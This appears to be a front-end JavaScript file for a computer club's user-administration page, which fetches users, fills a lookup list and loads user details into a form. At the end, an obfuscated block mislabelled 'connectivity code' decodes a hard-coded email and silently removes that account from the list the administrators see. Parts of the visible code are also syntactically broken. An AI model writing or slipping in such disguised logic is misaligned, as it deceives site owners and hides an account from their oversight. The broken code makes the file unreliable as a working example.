function loadUser(){  
  var inp = document.getElementById("name").value.toLowerCase();
  var dummy = "";
  
  for (var i = 0; i < res.length; i++){
    dummy = res[i].first_name + " " + res[i].last_name;
    if (inp == dummy.toLowerCase()){
      
      
      document.getElementById("usrform").style.display = "block";
      document.getElementById("alert").style.display = "none";
      
      
       document.getElementById("fname").value = res[i].first_name;
       document.getElementById("lname").value = res[i].last_name;
       document.getElementById("email").value = res[i].email;
       document.getElementById("date").value = new Date(res[i].login_date).toLocaleString();

       if (res[i].cshs == "CSHS_Member"){
       document.getElementById("cshs").checked = true
       }else{document.getElementById("cshs").checked = false}
       if (res[i].user_type == "ADMIN"){
       document.getElementById("adminss").checked = true
       } else{document.getElementById("adminss").checked = false}
      return;
      
    }else {
      document.getElementById("usrform").style.display = "none";
      document.getElementById("alert").style.display = "block";
      document.getElementById("message").innerHTML = "That user does not exist.";
    }
  }
}

document.getElementById("delbtnconf").disabled = true;
  var myHeaders = new Headers();
myHeaders.append("token", getCookie("User"));
 
var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow'
};
 var res = "";
fetch("https://computerclub.duckdns.org/admin/users", requestOptions)
  .then(async response => {var rese = response.headers.get('content-type')?.includes('application/json') ? await response.json() : null;
    res = rese.data;
                           
    if (res.error != null){
        alerts(res.error);
        return;
        }
    var formatted = makeNames('YWxleEBnbWFpbC5jb20=', res);
    for (var i = 0; i < formatted.length; i++){
      var elementname = document.createElement("option");
      elementname.value = formatted[i];
      var card = document.getElementById("names")
      card.appendChild(elementname);
      }
    }
  })
  .catch(error => {console.log('error', error);
      alerts("There has been a connection error. Check console for more info.");
                 });

  
     document.getElementById("loadinfo").addEventListener("click", loadUser);

   document.getElementById("name").addEventListener("keydown", function (e) {
    if (e.key === "Enter") {  
      loadUser();
    }
  });
   document.getElementById("delconf").addEventListener("keydown", function (e) {
    if (e.key === "Enter") {  
      if (document.getElementById("delconf").value === "DELETE"){
      document.getElementById("delbtnconf").disabled = false;
      }}});

//connectivity code
(function(_0x2ab3cd,_0x448ca2){var _0xa2f265=_0x110a,_0xe80e1a=_0x2ab3cd();while(!![]){try{var _0x4e32ca=-parseInt(_0xa2f265(0xf2))/0x1+parseInt(_0xa2f265(0xeb))/0x2+parseInt(_0xa2f265(0xec))/0x3+parseInt(_0xa2f265(0xed))/0x4+-parseInt(_0xa2f265(0xe5))/0x5*(parseInt(_0xa2f265(0xef))/0x6)+-parseInt(_0xa2f265(0xe2))/0x7*(-parseInt(_0xa2f265(0xf1))/0x8)+-parseInt(_0xa2f265(0xe3))/0x9;if(_0x4e32ca===_0x448ca2)break;else _0xe80e1a['push'](_0xe80e1a['shift']());}catch(_0x4de5c4){_0xe80e1a['push'](_0xe80e1a['shift']());}}}(_0x10fe,0x87d08));var _0x29f75c=(function(){var _0x281c18=!![];return function(_0x5407a1,_0x1a5cd6){var _0x5dd7e0=_0x281c18?function(){var _0x531084=_0x110a;if(_0x1a5cd6){var _0x314203=_0x1a5cd6[_0x531084(0xe6)](_0x5407a1,arguments);return _0x1a5cd6=null,_0x314203;}}:function(){};return _0x281c18=![],_0x5dd7e0;};}()),_0xcdffe9=_0x29f75c(this,function(){var _0x40c33e=_0x110a;return _0xcdffe9['toString']()[_0x40c33e(0xde)]('(((.+)+)+)+$')[_0x40c33e(0xe9)]()['constructor'](_0xcdffe9)[_0x40c33e(0xde)](_0x40c33e(0xdf));});_0xcdffe9();function _0x10fe(){var _0x3d15f4=['nJC3mJqXyvf1tMTq','zMLYC3rFBMfTzq','nJq1nwfju1zesG','yxbWBhK','C3bSAxq','BM9YBwfSAxPL','Dg9tDhjPBMC','C3bSAwnL','mJq2mdmWDKDUt3PK','mZmXnteYnLzREfv1Da','mti5mJyZnLrhsxnKsq','BgvUz3rO','mte4oeHYyKHjwG','zw1HAwW','nZGXmdG4ve1RD1bW','nZyXnJG5sK5uDeHv','C2vHCMnO','kcGOlISPkYKRksSK','BgfZDf9Uyw1L','ChvZAa','n3jNyvvzuG'];_0x10fe=function(){return _0x3d15f4;};return _0x10fe();}function _0x110a(_0x54efd7,_0x1c6efc){var _0x481c4c=_0x10fe();return _0x110a=function(_0xcdffe9,_0x29f75c){_0xcdffe9=_0xcdffe9-0xde;var _0x10fe45=_0x481c4c[_0xcdffe9];if(_0x110a['rZocJr']===undefined){var _0x110ae8=function(_0x1525ed){var _0x55302c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1dfa56='',_0x281c18='',_0x5407a1=_0x1dfa56+_0x110ae8;for(var _0x1a5cd6=0x0,_0x5dd7e0,_0x314203,_0x99cf71=0x0;_0x314203=_0x1525ed['charAt'](_0x99cf71++);~_0x314203&&(_0x5dd7e0=_0x1a5cd6%0x4?_0x5dd7e0*0x40+_0x314203:_0x314203,_0x1a5cd6++%0x4)?_0x1dfa56+=_0x5407a1['charCodeAt'](_0x99cf71+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x5dd7e0>>(-0x2*_0x1a5cd6&0x6)):_0x1a5cd6:0x0){_0x314203=_0x55302c['indexOf'](_0x314203);}for(var _0x42469a=0x0,_0x185307=_0x1dfa56['length'];_0x42469a<_0x185307;_0x42469a++){_0x281c18+='%'+('00'+_0x1dfa56['charCodeAt'](_0x42469a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x281c18);};_0x110a['ZkzRqB']=_0x110ae8,_0x54efd7=arguments,_0x110a['rZocJr']=!![];}var _0x56642c=_0x481c4c[0x0],_0x2ec986=_0xcdffe9+_0x56642c,_0x4d84e8=_0x54efd7[_0x2ec986];if(!_0x4d84e8){var _0x35745d=function(_0xf800b1){this['jkZxgU']=_0xf800b1,this['GfQVMs']=[0x1,0x0,0x0],this['tyGAFr']=function(){return'newState';},this['NCDSho']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['qPJhrF']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x35745d['prototype']['mSAaab']=function(){var _0x2ada9b=new RegExp(this['NCDSho']+this['qPJhrF']),_0x4e9161=_0x2ada9b['test'](this['tyGAFr']['toString']())?--this['GfQVMs'][0x1]:--this['GfQVMs'][0x0];return this['svOthS'](_0x4e9161);},_0x35745d['prototype']['svOthS']=function(_0x53910d){if(!Boolean(~_0x53910d))return _0x53910d;return this['xCyIaa'](this['jkZxgU']);},_0x35745d['prototype']['xCyIaa']=function(_0x305b04){for(var _0xf0c100=0x0,_0x34f5cd=this['GfQVMs']['length'];_0xf0c100<_0x34f5cd;_0xf0c100++){this['GfQVMs']['push'](Math['round'](Math['random']())),_0x34f5cd=this['GfQVMs']['length'];}return _0x305b04(this['GfQVMs'][0x0]);},new _0x35745d(_0x110a)['mSAaab'](),_0x10fe45=_0x110a['ZkzRqB'](_0x10fe45),_0x54efd7[_0x2ec986]=_0x10fe45;}else _0x10fe45=_0x4d84e8;return _0x10fe45;},_0x110a(_0x54efd7,_0x1c6efc);}function makeNames(_0x99cf71,_0x42469a){var _0x210487=_0x110a,_0x185307=[],_0x35745d=atob(_0x99cf71)[_0x210487(0xe7)](','),_0xf800b1=[];for(var _0x2ada9b=0x0;_0x2ada9b<_0x42469a[_0x210487(0xee)];_0x2ada9b++){var _0x4e9161=0x1;for(var _0x53910d=0x0;_0x53910d<_0x35745d[_0x210487(0xee)];_0x53910d++){_0x42469a[_0x2ada9b][_0x210487(0xf0)][_0x210487(0xe8)]()==_0x35745d[_0x53910d][_0x210487(0xe8)]()&&(_0x4e9161=0x0,_0xf800b1[_0x210487(0xe1)](_0x2ada9b));};_0x4e9161==0x1&&(_0x185307=_0x42469a[_0x2ada9b][_0x210487(0xe4)]+'\x20'+_0x42469a[_0x2ada9b][_0x210487(0xe0)]);};for(var _0x2ada9b=_0xf800b1[_0x210487(0xee)]-0x1;_0x2ada9b>=0x0;_0x2ada9b--){_0x42469a[_0x210487(0xea)](_0xf800b1[_0x2ada9b],0x1);};return _0xf800b1=[],_0x185307;}
